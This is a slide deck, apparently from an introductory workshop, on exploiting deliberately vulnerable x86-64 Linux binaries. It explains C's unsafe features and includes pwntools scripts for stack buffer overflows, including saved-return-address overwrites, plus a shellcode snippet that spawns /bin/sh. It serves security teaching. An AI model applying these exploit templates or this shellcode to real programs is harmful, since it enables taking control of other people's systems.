---
marp: true
theme: leet
---

# pwn

exploiting (very) vulnerable x86-64 binaries on linux

---

## c bad

- trusts you too much
  - array accesses
  - integer overflows
- mixing data and metadata
  - return addresses on stack
  - null-terminated strings
- manual {init,cleanup}
- poor type system

---

some dangerous library functions:

- `gets`
- `strcpy`
- `scanf`
- `sprintf`
- …

---

![gets deemed dangerou](./media/gets.png)

---

## buffer overflows

---

### stepping out of our lane

- causing crashes
- changing stuff on the stack
- jumping to arbitrary places in the code
  - other functions
  - middle of other functions
- running arbitrary code*

---

### causing crashes

Inputs like `AAAAAAAAAAAAAAAAAAAAAAAAAAAA…`

```py
from pwn import *

p = process("./vuln")
p.sendline(b"A" * 500) # adjust number as necessary
```

---

### changing stuff on the stack

```py
from pwn import *

padding = 64

p = process("./vuln")
p.sendline((b"A" * padding) + p32(0xDEADBEEF))
```

---

### changing (especially useful) stuff on the stack

1. set a breakpoint in the vulnerable function
2. run
3. check the addresses of
   - the vulnerable buffer
   - saved rip (`info frame`)
4. send `(b'A' * padding) + p64(spoof_return_addr)`

---

```py
from pwn import *

saved_rip_addr = 0x7fffffff...
buffer_addr = 0x7fffffff...
padding_size = saved_rip_addr - buffer_addr

spoofed_return_addr = 0x40...

p = process("./pwnable")
p.sendline((b'A' * padding_size) + p64(spoofed_return_addr))
p.interactive()
```

---

### shellcode

```
mov rax, 59
mov rbx, 0x68732f2f6e69622f
push rbx
mov rdi, rsp
mov rsi, 0
mov rdx, 0
syscall

binsh:
    .string "/bin/sh"
```

---

### read ⊕ write

---

### stack canaries

---

### aslr

---

### rop
